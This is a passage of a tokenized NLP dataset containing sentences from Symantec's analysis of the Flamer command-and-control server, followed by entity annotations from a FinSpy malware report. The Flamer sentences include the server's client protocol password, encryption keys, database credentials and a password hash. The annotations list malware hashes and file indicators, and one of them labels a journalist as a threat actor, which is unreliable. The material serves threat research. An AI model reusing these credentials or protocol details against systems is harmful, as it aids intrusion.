"and", "also", "worked", "on", "the", "control", "panel", "that", "the", "operators", "used", "."], ["It", "is", "likely", "D", "*", "*", "*", "and", "O", "*", "*", "*", "*", "*", "*", "knew", "each", "other", ",", "as", "they", "both", "worked", "on", "the", "same", "files", "and", "during", "a", "similar", "time", "period", "in", "December", "2006", "."], ["Page", "8", "Security", "Response"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "H", "*", "*", "*", "*", "*", "is", "responsible", "for", "the", "SignupProtocol", ",", "while", "D", "*", "*", "*", "is", "involved", "in", "the", "OldProtocol", "(", "Flamer", ")", ",", "both", "of", "which", "will", "be", "discussed", "in", "more", "detail", "in", "the", "next", "section", "."], ["Protocols"], ["The", "main", "module", "communicating", "with", "the", "compromised", "clients", "is", "index.php", "."], ["It", "deciphers", "the", "protocol", "then", "logs", ",", "decodes", ",", "and", "processes", "requests", "."], ["Four", "protocols", "have", "been", "identified", ",", "of", "which", "three", "are", "in", "use", "."], ["The", "Red", "protocol", "has", "not", "been", "implemented", "yet", "."], ["The", "existence", "of", "three", "supported", "protocols", ",", "along", "with", "one", "protocol", "under", "development", ",", "confirms", "the", "C&C", "server", "\u2019s", "requirement", "to", "communicate", "with", "multiple", "evolutions", "(", "variants", ")", "of", "W32.Flamer", "or", "additional", "cyberespionage", "malware", "families", "currently", "unknown", "to", "the", "public", "."], ["Page", "9"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "These", "protocols", "are", "identified", "in", "the", "table", "below", ":", "Table", "8"], ["Protocol", "Identifier", "Protocol", "Request", "PROTOCOL_OLD", "*", "HTTPS", "UNIQUE_NUMBER=[DIGITS]&PASSWORD", "=", "LifeStyle2", "PROTOCOL_SIGNUP", "HTTPS", "uid=[DIGITS]&action=[DIGITS", "]", "PROTOCOL_OLD_E", "*", "*", "HTTP", "NOT(uid=[DIGITS]&action=[DIGITS", "]", ")", "PROTOCOL_RED", "N", "/", "A", "N", "/", "A", "*", "Used", "by", "W32.Flamer"], ["*", "*", "PROTOCOL_OLD", "with", "custom", "encryption", "over", "HTTP"], ["Specific", "requests", "handled", "by", "the", "application", "are", ":", "Table", "9", "Request", "Functionality", "GetNewsHandler", "Responsible", "for", "sending", "news", "to", "compromised", "clients", "AddEntryHandler", "Responsible", "for", "storing", "entries", "(", "stolen", "data", ")", "from", "compromised", "clients", "GetAdHandler", "Responsible", "for", "sending", "ads", "to", "compromised", "clients", "The", "possibility", "that", "multiple", "Trojans", ",", "or", "at", "least", "evolutions", "of", "W32.Flamer", ",", "are", "at", "work", "here", "is", "backed", "up", "by", "the", "fact", "that", "four", "different", "IDs", "are", "used", "internally", "to", "identify", "them", ":", "Table", "10", "Client", "Internal", "ID", "Protocol", "Threat", "CLIENT_TYPE_SP", "1", "PROTOCOL_OLD", "Unknown", "CLIENT_TYPE_SPE", "2", "PROTOCOL_OLD_E", "Unknown", "CLIENT_TYPE_FL", "3", "PROTOCOL_OLD", "W32.Flamer", "CLIENT_TYPE_IP", "6", "PROTOCOL_SIGNUP", "Unknown"], ["N", "/", "A", "N", "/", "A", "PROTOCOL_RED", "Unknown", "Page", "10"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response"], ["Here", "is", "a", "snippet", "of", "code", "that", "identified", "connecting", "clients", ":", "It", "is", "likely", "here", "that", "CLIENT_TYPE_SP", ",", "CLIENT_TYPE_SPE", ",", "and", "CLIENT_TYPE_FL", "implemented", "by", "D", "*", "*", "*", "are", "evolutions", "of", "the", "same", "threat", "."], ["However", ",", "CLIENT_TYPE_IP", "which", "is", "implemented", "by", "H", "*", "*", "*", "*", "*", "appears", "to", "come", "after", "the", "in", "-", "use"], ["Flamer", "protocol", ",", "which", "suggests", "that", "either", "new", "variants", "exist", "that", "we", "are", "unaware", "of", ",", "or", "there", "is", "a", "separate", "Trojan", "at", "work", "."], ["They", "also", "included", "an", "unrecognized", "fallback", "for", "clients", "."], ["Stolen", "Data", "Compromised", "clients", "upload", "stolen", "data", "to", "the", "entries", "directory", "."], ["Files", "stored", "in", "this", "directory", "are", "encrypted", "with", "a", "public", "key", "stored", "in", "the", "database", "."], ["These", "files", "can", "not", "be", "decrypted", "without", "the", "corresponding", "private", "key", "."], ["There", "was", "a", "file", "of", "157,548", "bytes", "still", "left", "on", "the", "server", "that", "the", "operators", "did", "not", "have", "the", "opportunity", "to", "download", "."], ["The", "stolen", "data", "is", "encrypted", "with", "this", "public", "key", "on", "the", "server", ",", "thus", "requiring", "the", "corresponding", "unknown", "private", "key", "to", "decrypt", ":", "-----BEGIN"], ["PUBLIC", "KEY----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtZslxFiR9KJE05Nhh7Xk", "+", "lVVpD9F6AQnvZeknDiwL3SBjZB", "/", "dB", "/", "LLXtwiet8LUS6JYCXnaIq4NxW1PymwGFZ"], ["zuc", "/", "B3p+ZAFPt06veOHOfaMAI0KDMb+laNPINvn", "/", "jJ8TfvCaUMUuMEY4sayh0xwD", "MwSAazMYI8rvaaS", "/", "BqhI/6vPN6D02UIpwT1TSBVeRRoPBHuYE7A93b8vJw9sBGIp", "KXZ90sgP1CjdAmCbhYelelninKdeTKCGvd5YXt86grWgEVf5WXzxXi3ZK1T4w0Yt", "mNhUEAwS7zCdtZ+Ak8b0M83wAirASvPZiBl6qF8hqCT5pKkwgBG//kk8JicboLsM", "VQIDAQAB", "-----END", "PUBLIC", "KEY----Based", "on", "timestamps", "seen", "on", "the", "first", "server", "in", "the", "/newsforyou", "/", "bak", "directory", "we", "determined", "that", "the", "operators", "downloaded", "the", "stolen", "data", "on", "four", "separate", "dates", "in", "May.", "Table", "11", "Date", "Stolen", "data", "files", "2012", "-", "05", "-", "22", "112", "2012", "-", "05", "-", "23", "12", "2012", "-", "05", "-", "24", "11", "2012", "-", "05", "-", "30", "43", "Page", "11", "Security", "Response"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "A", "total", "of", "around", "75", "MB", "of", "stolen", "data", "was", "found", "in", "the", "backups", "on", "one", "of", "the", "servers", "(", "server", "#", "1", ")", "."], ["Although", "the", "timing", "data", "is", "limited", "here", ",", "the", "timestamps", "of", "these", "backups", "suggest", "that", "the", "operators", "could", "be", "in", "the", "EMEA", "region", "."], ["There", "was", "a", "four", "-", "day", "delay", "from", "the", "initial", "setup", "to", "when", "the", "operators", "began", "to", "retrieve", "stolen", "data", "."], ["This", "is", "a", "possible", "indicator", "that", "the", "information", "about", "the", "new", "server", "had", "to", "take", "time", "to", "filter", "down", "to", "them", "."], ["Figure", "3.1", "Megabytes", "of", "stolen", "data", "by", "date", ",", "server", "#", "1", "In", "comparison", ",", "the", "other", "server", "(", "server", "#", "2", ")", "saw", "a", "massive", "5.7", "GB", "of", "stolen", "data", ":"], ["Figure", "3.2", "Megabytes", "of", "stolen", "data", "by", "date", ",", "server", "#", "2", "Page", "12", "Security", "Response"], ["Have"], ["I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Activity"], ["By", "examining", "the", "files", "in", "the", "bak", "directories", ",", "specifically", "the", "number", "of", "files", "contained", "within", "the", "backup", "archives", "created", "each", "day", ",", "it", "is", "possible", "to", "obtain", "an", "indication", "of", "the", "activity", "of", "the", "C&C", "server", ",", "which", "can", "be", "seen", "in", "the", "chart", "below", ":"], ["Figure", "4.1", "Number", "of", "backup", "archives", "created", "each", "day", ",", "server", "#", "1", "Figure", "4.2", "Number", "of", "backup", "archives", "created", "each", "day", ",", "server", "#", "2", "On", "the", "first", "server", ",", "there", "is", "a", "clear", "increase", "in", "activity", "around", "May", "20", ",", "which", "then", "drops", "off", "."], ["This", "is", "to", "be", "expected", "as", "computers", "are", "cleared", "up", "."], ["On", "the", "second", "server", "the", "Flamer", "operation", "is", "in", "full", "flow", "and", "huge", "volumes", "of", "files", "are", "being", "created", "on", "the", "system", "."], ["Page", "13"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "Payload"], ["The", "news", "directory", "contains", "a", "compressed", "and", "encrypted", "file", "for", "distribution", "to", "the", "compromised", "clients", "connecting", "to", "the", "server", "."], ["This", "file", "is", "encrypted", "with", "a", "known", "symmetric", "key", "retrieved", "from", "the", "database", "."], ["Table", "12", "MD5", "Filename", "File", "size", "0xfccd97e2513089e74ba707bbf4c1b0e5", "59c5452fb2ba21091513ccdc1e0ec7fd", "204,024", "bytes"], ["This", "is", "the", "browse32.ocx", "Flamer", "module", ",", "the", "sole", "purpose", "of", "which", "is", "to", "remove", "all", "known", "traces", "of", "the", "Flamer", "malware", "from", "the", "compromised", "client", "."], ["The", "payload", "is", "encrypted", "with", "this", "symmetric", "key", ":", "R&^T&IOHIO%^&^E%@#$UIO", "*", "(", ")", "The", "control", "panel"], ["Access", "to", "the", "Flamer", "control", "panel", "requires", "authentication", ":"], ["Figure", "5", "Control", "panel", "login", "page", "The", "following", "credentials", "are", "used", "to", "gain", "access", "to", "the", "control", "panel", "(", "only", "the", "MD5", "password", "hash", "is", "available", ";", "attempts", "to", "crack", "the", "password", "were", "unsuccessful", "):", "Username", ":", "username"], ["Password", "Hash", ":", "27934e96d90d06818674b98bec7230fa"], ["The", "control", "panel", "for", "interacting", "with", "Flamer", "-", "compromised", "computers", "is", "very", "basic", "."], ["The", "simple", "interface", "allows", "the", "operators", "to", "upload", "packages", "and", "download", "encrypted", "data", "stolen", "from", "the", "compromised", "clients", "."], ["The", "operator", "is", "required", "to", "upload", "specially", "crafted", "tar.gz", "files", "."], ["The", "archived", "filename", "needs", "to", "follow", "a", "specific", "format", ",", "which", "is", "parsed", "and", "then", "stored", "in", "the", "ads", "or", "news", "directory", ",", "depending", "on", "the", "file", "extension", "used", "."], ["The", "filename", "format", "for", "these", "packages", "is", "as", "follows", ":"], ["[", "USER", "_", "TYPE", "]", "_"], ["[", "USER", "_", "ID", "]", "_"], ["[", "PRIORITY", "]", "_"], ["[", "TEMP", "_", "FLAG][OPTIONAL", "_", "AND", "_", "IGNORED].news"], ["[", "USER", "_", "TYPE", "]", "_"], ["[", "USER", "_", "ID", "]", "_"], ["[", "EXPIRY", "_", "TIME", "]", "_"], ["[", "AD", "_", "NAME].ad", "Page", "14", "Security", "Response", "Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "The", "following", "is", "a", "screen", "shot", "of", "the", "control", "panel", "that", "allows", "the", "operator", "to", "upload", "data", "to", "the", "server", ":", "Figure", "6", "Control", "panel", "data", "upload", "screen", "This", "approach", "to", "uploading", "packages", "and", "downloading", "data", "fits", "the", "profile", "of", "military", "and", "intelligence", "operations", "."], ["A", "typical", "control", "panel", "is", "easy", "to", "use", "and", "self", "-", "explanatory", "."], ["The", "operator", "has", "full", "control", "over", "what", "to", "do", "with", "the", "compromised", "clients", "and", "has", "the", "ability", "to", "retrieve", "and", "inspect", "the", "stolen", "information", "."], ["The", "Flamer", "control", "panel", "provides", "limited", "capabilities", "to", "the", "operator", ",", "preventing", "them", "from", "viewing", "and", "interpreting", "the", "information", "being", "exchanged", "."], ["This", "approach", "would", "help", "prevent", "operators", "from", "knowing", "what", "is", "contained", "within", "the", "packages", "or", "the", "significance", "of", "the", "data", "being", "exchanged", "between", "clients", "and", "the", "attackers", "."], ["Such", "a", "design", "would", "also", "serve", "as", "a", "defensive", "measure", "as", "it", "would", "prevent", "arbitrary", "packages", "from", "being", "uploaded", "and", "prevent", "downloaded", "data", "being", "from", "being", "inspected", "by", "unknown", "parties", "that", "may", "have", "gained", "access", "to", "the", "control", "panel", "."], ["The", "following", "screen", "on", "the", "control", "panel", "allows", "the", "user", "to", "view", "and", "download", "backed", "up", "data", "from", "the", "server", ":", "Figure", "7", "Control", "panel", "screen", "for", "downloading", "stolen", "data", "Page", "15"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "The", "tar.gz", "contains", "all", "the", "relevant", "stolen", "data", "and", "details", "of", "where", "the", "information", "was", "stolen", "from", "."], ["The", "private", "key", "is", "required", "here", "to", "inspect", "the", "encrypted", "data", "."], ["The", "database", "Location", ":", "/var", "/", "lib", "/", "mysql"], ["The", "database", "is", "used", "to", "store", "the", "relevant", "data", "about", "connecting", "clients", ",", "packages", "to", "send", "to", "the", "clients", ",", "some", "logging", "and", "settings", "required", "for", "encryption", ",", "and", "authentication", "to", "access", "the", "control", "panel", "."], ["Table", "13", "Database", "User", "Password", "MySQL", "news_user", "news_pass", "Schema"], ["The", "database", "is", "used", "to", "store", "the", "relevant", "data", "about", "connecting", "clients", ",", "packages", "to", "send", "to", "the", "clients", ",", "some", "logging", "and", "settings", "required", "for", "encryption", ",", "and", "authentication", "to", "access", "the", "control", "panel", "."], ["Figure", "8", "Newsforyou", "application", "database", "schema", "Page", "16"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response", "The", "session_log", ",", "log", ",", "and", "client_log", "are", "all", "encrypted", "using", "the", "keys", "stored", "in", "the", "settings", "table", "shown", "below", "and", "were", "successfully", "decrypted", ":", "Table", "14", "Variable", "Value", "is_online", "True", "cp_user", "username", "cp_hash", "8", "27934e96d90d06818674b98bec7230fa", "max_backup_size", "52428800"], ["version", "1.4.11.4.1", "minimum_unload_size", "1572864", "unload_flag", "0", "general_key", "acK3xKMoJzsa9AVvtg59+OT4RM", "/"], ["x5MQ3bO2p0j+5Jd0=", "session_key", "13eZ+Now4Pt5ATpPv3WUv1E8UrvJReVMD0pO0MTQqoI=", "The", "database", "is", "regularly", "emptied", "by", "the", "delete.php", "script", ";", "there", "is", "limited", "data", "in", "it", "."], ["The", "following", "table", "gives", "a", "brief", "description", "of", "the", "tables", "found", "in", "the", "database", ":", "Table", "15", "Table", "Records", "Record", "I", "d", "Encryption", "Description", "settings", "11", "11", "N", "Configuration", "values", "listed", "in", "the", "table", "below", "session_log", "8", "1144", "Y", "Encrypted", "session", "log", "client_log", "4", "1071", "Y", "Encrypted", "client", "log", "log", "213", "21259"], ["Y", "Encrypted", "logs", "news_entries", "1", "1", "N", "Entries", "in", "newsforyou", "/", "news", "(", "payloads", ")", "blog_entries", "1", "189", "N", "Entries", "in", "newsforyou", "/", "entries", "(", "stolen", "data", ")", "ads", "0", "n", "/", "a", "N"], ["Ad", "files", "in", "newsforyou", "/", "ads/", "backup", "4", "4", "N", "Backup", "files", "in", "newsforyou", "/", "bak/"], ["The", "session_log", "table", "contains", "details", "of", "all", "connections", "to", "the", "server", "while", "client_log", "only", "contains", "connections", "with", "a", "recognized", "protocol", "(", "e.g.", "valid", "compromised", "computers", ")", "."], ["Examining", "the", "data", "in", "the", "table", "indicates", "that", "1071", "valid", "requests", "were", "recorded", "from", "compromised", "clients", "."], ["A", "decrypted", "client", "log", "entry", "contains", "the", "following", "information", ":"], ["CLIENT", "_", "ID:[UUID", "]"], ["CLIENT", "_", "TYPE:3"], ["CLIENT", "_", "VERSION:0", "REQUEST", "_", "TYPE:0"], ["RAW", "_", "REQUEST", ":"], ["UNIQUE", "_", "NUMBER=[UUID]&PASSWORD", "=", "LifeStyle2&ACTION=1&FILE", "_"], ["NAME=&FILE", "_", "SIZE=0", "PROTOCOL:1"], ["The", "four", "encrypted", "requests", "in", "the", "database", "on", "the", "first", "server", "are", "W32.Flamer", "client", "requests", ",", "which", "use", "the", "old", "protocol", ":", "\u2022", "CLIENT", "\u2022", "PROTOCOL", "=", "=", "3", "1", "=", "=", "CLIENT_TYPE_FL"], ["OLD_PROTOCOL", "Page", "17"], ["Have", "I", "Got", "Newsforyou", ":", "Analysis", "of", "Flamer", "C&C", "Server", "Security", "Response"], ["The", "additional", "sessions", "logged", "are", "likely", "attributed", "to", "researchers", "who", "had", "discovered", "the", "whereabouts", "of", "the", "command", "-", "and", "-", "control", "servers", "."], ["Table", "16"], ["IP", "Address", "Organization", "Country", "client_log", "77.42.[REMOVED", "]"], ["LIBANTELECOM", "Lebanon", "Y", "37.8", "."], ["[", "REMOVED", "]", "Israel", "Haifa", "Hadara", "Technologies", "Private", "Shareholding", "Company", "Israel", "Y", "37.75", "."], ["[", "REMOVED", "]", "Orange", "Palestine", "Group", "Co.", "for", "Technological", "Inves", "Palestine", "Y", "79.212", "."], ["[", "REMOVED", "]", "Deutsche", "Telekom", "AG", "Germany", "N", "95.211", "."], ["[", "REMOVED", "]", "LeaseWeb", "B.V.", "Netherlands", "N", "The", "session_log", "data", "contained", "three", "separate", "HTTP_HOST", "values", ",", "indicating", "multiple", "Flamer", "C&C", "server", "URLs", "were", "used", "to", "access", "this", "server", "."], ["Although", "only", "one", "encrypted", "file", "existed", "in", "the", "newsforyou", "/", "entries", "folder", "(", "the", "stolen", "data", "uploaded", "from", "the", "compromised", "clients", ")", ",", "the", "database", "reveals", "that", "189", "records", "had", "been", "created", "."], ["The", "other", "188", "files", "had", "already", "been", "removed", "from", "the", "server", "."], ["The", "entry", "left", "on", "the", "server", "had", "been", "successfully", "stolen", "from", "the", "computer", "located", "in", "Israel", "."], ["A", "final", "point", "to", "note", "here", "is", "in", "relation", "to", "the", "entry", "in", "the", "news_entries", "table", "."], ["Only", "one", "record", "ever", "existed", ":", "the", "malicious", "payload", "to", "clean", "the", "computers", "up", ",", "uploaded", "on", "May", "18", ",", "2012", ",", "at", "13.43:45", "."], ["This", "server", "only", "served", "up", "one", "package", "and", "it", "was", "uploaded", "as", "soon", "as", "the", "server", "had", "been", "initially", "configured", "."], ["The", "last", "time", "a", "compromised", "client", "connected", "to", "the", "server", "was", "Friday", ",", "June", "1", ",", "2012", ",", "at", "11:42:47", ",", "and", "the", "last", "log", "recorded", "in", "the", "database", "was", "Friday", ",", "June", "1", ",", "2012", ",", "at", "11:46:01", "."], ["Conclusion"], ["Examining", "the", "W32.Flamer", "servers", "has", "provided", "additional", "insight", "into", "the", "architecture", "of", "not", "only", "the", "threat", ",", "but", "also", "into", "the", "command", "structure", "of", "the", "entities", "behind", "it", "."], ["The", "server", "code", "was", "written", "and", "updated", "by", "at", "least", "four", "separate", "individuals", ",", "indicating", "a", "continuing", "development", "effort", "to", "support", "W32.Flamer", "and", ",", "potentially", ",", "new", "or", "additional", "threats", "of", "a", "similar", "nature", "."], ["The", "command", "-", "and", "-", "control", "Web", "application", "has", "been", "in", "active", "development", "for", "many", "years", ",", "possibly", "as", "early", "as", "2006", ",", "which", "is", "well", "before", "Flamer", "\u2019s", "earliest", "seen", "compilation", "date", "in", "2010", "."], ["The", "operators", "of", "the", "C&C", "servers", "may", "be", "a", "group", "of", "less", "senior", "individuals", ",", "working", "on", "a", "need", "-", "to", "-", "know", "basis", ",", "as", "the", "operator", "is", "not", "required", "(", "nor", "has", "the", "permission", ")", "to", "interpret", "the", "value", "or", "purpose", "of", "the", "incoming", "data", "."], ["Only", "the", "attackers", "have", "the", "permission", "to", "access", "and", "interpret", "this", "data", "."], ["This", "separation", "of", "operational", "and", "attacker", "visibility", "and", "roles", "indicates", "that", "this", "is", "the", "work", "of", "a", "highly", "organized", "and", "sophisticated", "group", "."], ["The", "likelihood", "of", "a", "large", "and", "well", "-", "funded", "entity", "\u2019s", "involvement", "in", "Flamer", "is", "corroborated", "by", "the", "use", "of", "the", "unique", "certificate", "weakness", "used", "to", "hijack", "the", "Windows", "Update", "feature", "to", "spread", "across", "networks", "."], ["They", "were", "also", "careful", "to", "unload", "and", "archive", "data", "where", "necessary", ",", "remove", "duplicate", "files", ",", "and", "delete", "unnecessary", "files", "to", "prevent", "the", "server", "from", "running", "out", "of", "disk", "space", "."], ["This", "was", "an", "ongoing", "development", "up", "to", "2011", "."], ["R", "*", "*", "*", "\u2019s", "edits", "in", "the", "source", "code", "suggest", "the", "concern", "was", "less", "about", "updating", "protocols", "and", "more", "about", "ensuring", "there", "was", "ample", "room", "on", "the", "servers", "for", "the", "stolen", "data", "to", "be", "uploaded", "to", ",", "begging", "the", "question", "of", "how", "much", "data", "was", "actually", "being", "stolen", "."], ["This", "investigation", "simply", "provides", "a", "snapshot", "in", "time", "of", "the", "Flamer", "attack", "campaign", "."], ["Considering", "that", "logging", "was", "disabled", "and", "data", "was", "wiped", "clean", "in", "such", "a", "thorough", "manner", ",", "the", "remaining", "clues", "make", "it", "virtually", "impossible", "to", "determine", "the", "entity", "behind", "the", "campaign", "."], ["There", "is", "little", "doubt", "that", "the", "larger", "project", "involving", "cyber", "-", "espionage", "tools", ",", "such", "as", "Flamer", ",", "will", "continue", "to", "evolve", "and", "retrieve", "information", "from", "the", "designated", "targets", "."], ["Page", "18", "Security", "Response"], ["Have", "I", "Got", "Newsforyou", ":"], ["Analysis", "of", "Flamer", "C&C", "Server", "Resources"], ["Flamer", ":", "Highly", "Sophisticated", "and", "Discreet", "Threat", "Targets", "the", "Middle", "East", "http://symantec.com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east"], ["Painting", "a", "Picture", "of", "W32.Flamer"], ["http://symantec.com/connect/blogs/painting-picture-w32flamer"], ["Flamer", ":"], ["A", "Recipe", "for", "Bluetoothache", "http://symantec.com/connect/blogs/flamer-recipe-bluetoothache", "W32.Flamer", ":", "Spreading", "Mechanism", "Tricks", "and", "Exploits", "http://symantec.com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits", "W32.Flamer", ":"], ["Leveraging", "Microsoft", "Digital", "Certificates", "http://symantec.com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates", "W32.Flamer", ":", "Microsoft", "Windows", "Update", "Man", "-", "in", "-", "the", "-", "Middle", "http://symantec.com/connect/blogs/w32flamer-microsoft-windows-update-man-middle", "W32.Flamer", ":", "Enormous", "Data", "Collection", "http://symantec.com/connect/blogs/w32flamer-enormous-data-collection"], ["Flamer", ":", "Urgent", "Suicide", "http://symantec.com/connect/blogs/flamer-urgent-suicide", "Page", "19", "Security", "Response"], ["Any", "technical", "information", "that", "is", "made", "available", "by", "Symantec", "Corporation", "is", "the", "copyrighted", "work", "of", "Symantec", "Corporation", "and", "is", "owned", "by", "Symantec", "Corporation", "."], ["NO", "WARRANTY", "."], ["The", "technical", "information", "is", "being", "delivered", "to", "you", "as", "is", "and", "Symantec", "Corporation", "makes", "no", "warranty", "as", "to", "its", "accuracy", "or", "use", "."], ["Any", "use", "of", "the", "technical", "documentation", "or", "the", "information", "contained", "herein", "is", "at", "the", "risk", "of", "the", "user", "."], ["Documentation", "may", "include", "technical", "or", "other", "inaccuracies", "or", "typographical", "errors", "."], ["Symantec", "reserves", "the", "right", "to", "make", "changes", "without", "prior", "notice", "."], ["About", "Symantec", "Symantec", "is", "a", "global", "leader", "in", "providing", "security", ",", "storage", "and", "systems", "management", "solutions", "to", "help", "businesses", "and", "consumers", "secure", "and", "manage", "their", "information", "."], ["Headquartered", "in", "Mountain", "View", ",", "Calif.", ",", "Symantec", "has", "operations", "in", "more", "than", "40", "countries", "."], ["More", "information", "is", "available", "at", "www.symantec.com", "."], ["For", "specific", "country", "offices", "and", "contact", "numbers", ",", "please", "visit", "our", "Web", "site", "."], ["For", "product", "information", "in", "the", "U.S.", ",", "call", "toll", "-", "free", "1", "(", "800", ")", "745", "6054", "."], ["Symantec", "Corporation", "World", "Headquarters", "350", "Ellis", "Street", "Mountain", "View", ",", "CA", "94043"], ["USA"], ["+1", "(", "650", ")", "527", "-", "8000", "www.symantec.com", "Copyright", "\u00a9", "2012", "Symantec", "Corporation", "."], ["All", "rights", "reserved", "."], ["Symantec", "and", "the", "Symantec", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Symantec", "Corporation", "or", "its", "affiliates", "in", "the", "U.S.", "and", "other", "countries", "."], ["Other", "names", "may", "be", "trademarks", "of", "their", "respective", "owners", "."]]}, {"vertexSet": [[{"name": "The Citizen Lab", "pos": [4, 7], "sent_id": 0, "type": "Organization"}], [{"name": "FinFisher Suite", "pos": [1, 3], "sent_id": 3, "type": "Software"}], [{"name": "Gamma International UK Ltd.", "pos": [9, 13], "sent_id": 3, "type": "Organization"}], [{"name": "Vernon Silver", "pos": [11, 13], "sent_id": 6, "type": "Person"}], [{"name": "Bloomberg News", "pos": [14, 16], "sent_id": 6, "type": "Organization"}], [{"name": "Bahraini pro-democracy activists", "pos": [20, 25], "sent_id": 6, "type": "ExploitTargetObject"}], [{"name": "April", "pos": [26, 27], "sent_id": 6, "type": "Time"}], [{"name": "May", "pos": [28, 29], "sent_id": 6, "type": "Time"}], [{"name": "Finspy", "pos": [7, 8], "sent_id": 12, "type": "Malware"}], [{"name": "Bahraini activists", "pos": [8, 10], "sent_id": 15, "type": "ExploitTargetObject"}], [{"name": "Bahrain", "pos": [9, 10], "sent_id": 16, "type": "Country"}], [{"name": "Melissa Chan", "pos": [20, 22], "sent_id": 18, "type": "ThreatActor"}], [{"name": "Aljazeera English", "pos": [30, 32], "sent_id": 18, "type": "Organization"}], [{"name": "324783fbc33ec117f971cca77ef7ceaf7ce229a74edd6e2b3bd0effd9ed10dcc rar.\u202b\u0627\u0644\u0641\u0639\u0627\u0644\u064a\u0627\u062a", "pos": [6, 8], "sent_id": 20, "type": "Malware"}], [{"name": "c5b39d98c85b21f8ac1bedd91f0b6510ea255411cf19c726545c1d0a23035914 _gpj.ArrestedXSuspects.rar", "pos": [8, 11], "sent_id": 20, "type": "Malware"}], [{"name": "c5b37bb3620d4e7635c261e5810d628fc50e4ab06b843d78105a12cfbbea40d7 KingXhamadXonXofficialXvisitXtoX.rar", "pos": [0, 2], "sent_id": 21, "type": "Malware"}], [{"name": "80fb86e265d44fbabac942f7b26c973944d2ace8a8268c094c3527b83169b3cc MeetingXAgenda.rar", "pos": [2, 4], "sent_id": 21, "type": "Malware"}], [{"name": "f846301e7f190ee3bb2d3821971cc2456617edc2060b07729415c45633a5a751 Rajab.rar", "pos": [4, 6], "sent_id": 21, "type": "Malware"}], [{"name": "49000fc53412bfda157417e2335410cf69ac26b66b0818a3be7eff589669d040 dialoge.exe", "pos": [10, 12], "sent_id": 22, "type": "Malware"}], [{"name": "cc3b65a0f559fa5e6bf4e60eef3bffe8d568a93dbb850f78bdd3560f38218b5c exe.Rajab1.jpg", "pos": [12, 14], "sent_id": 22, "type": "Malware"}], [{"name": "39b325bd19e0fe6e3e0fca355c2afddfe19cdd14ebda7a5fc96491fc66e0faba exe.image1.jpg", "pos": [14, 16], "sent_id": 22, "type": "Malware"}], [{"name": "e48bfeab2aca1741e6da62f8b8fc9e39078db574881691a464effe797222e632 exe.Rajab.jpg", "pos": [16, 18], "sent_id": 22, "type": "Malware"}], [{"name": "2ec6814e4bad0cb03db6e241aabdc5e59661fb580bd870bdb50a39f1748b1d14 exe.Arrested Suspects.jpg", "pos": [18, 23], "sent_id": 22, "type": "Malware"}], [{"name": "c29052dc6ee8257ec6c74618b6175abd6eb4400412c99ff34763ff6e20bab864 News about the existence of a new dialogue between AlWefaq & Govt..doc", "pos": [23, 38], "sent_id": 22, "type": "Malware"}], [{"name": "July 2012", "pos": [39, 41], "sent_id": 22, "type": "Time"}], [{"name": "righttoleftoverride", "pos": [15, 16], "sent_id": 24, "type": "Obfuscation"}], [{"name": "RLO", "pos": [18, 19], "sent_id": 24, "type": "Obfuscation"}], [{"name": "Arrested Suspects.jpg", "pos": [3, 5], "sent_id": 36, "type": "Malware"}], [{"name": "gpj.stcepsuS detserrA.exe", "pos": [8, 10], "sent_id": 36, "type": "Malware"}], [{"name": "C:\\Documents and Settings\\XPMUser\\Local Settings\\Temp\\TMP51B7AFEF", "pos": [32, 36], "sent_id": 36, "type": "Indicator"}], [{"name": "C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\delete.bat", "pos": [0, 1], "sent_id": 39, "type": "TrojanHorse"}], [{"name": "C:\\DOCUME~1\\%USER%\\LOCALS~1\\Temp\\driverw.sys", "pos": [1, 2], "sent_id": 39, "type": "TrojanHorse"}], [{"name": "C:\\Documents and Settings\\%USER%\\Application Data\\Microsoft\\Installer\\{5DA45CC9-D840-47CC9F86-FD2E9A718A41}", "pos": [15, 26], "sent_id": 40, "type": "Indicator"}], [{"name": "driverw.sys", "pos": [19, 20], "sent_id": 41, "type": "TrojanHorse"}], [{"name": "delete.bat", "pos": [26, 27], "sent_id": 41, "type": "TrojanHorse"}], [{"name": "July 2012", "pos": [1, 3], "sent_id": 43, "type": "Time"}], [{"name": "process hollowing", "pos": [24, 26], "sent_id": 43, "type": "MalwareCharacteristics"}], [{"name": "winlogon.exe", "pos": [10, 11], "sent_id": 44, "type": "Malware"}], [{"name": "y:\\lsvn_branches\\finspyv4.01\\finspyv2\\src\\target\\bootkit_x32driver\\objfre_w2k_x86\\i386\\bootkit_x32driv er.pdb", "pos": [0, 2], "sent_id": 49, "type": "Indicator"}], [{"name": "FinSpy", "pos": [1, 2], "sent_id": 52, "type": "Malware"}], [{"name": "virtualised packer", "pos": [1, 3], "sent_id": 56, "type": "Obfuscation"}], [{"name": "OllyDbg", "pos": [9, 10], "sent_id": 62, "type": "Software"}], [{"name": "DbgBreakPoint", "pos": [2, 3], "sent_id": 70, "type": "Software"}], [{"name": "C:\\Windows\\Installer\\{49FD463C-18F1-63C4-8F12-49F518F127}", "pos": [1, 9], "sent_id": 88, "type": "Indicator"}], [{"name": "t111o00000000.dat", "pos": [8, 9], "sent_id": 94, "type": "File"}], [{"name": "Thu Jun 14 2012 12:31:34", "pos": [0, 5], "sent_id": 95, "type": "Time"}], [{"name": "Thu Jun 14 2012 12:32:18", "pos": [0, 5], "sent_id": 97, "type": "Time"}], [{"name": "Thu Jun 14 2012 12:55:12", "pos": 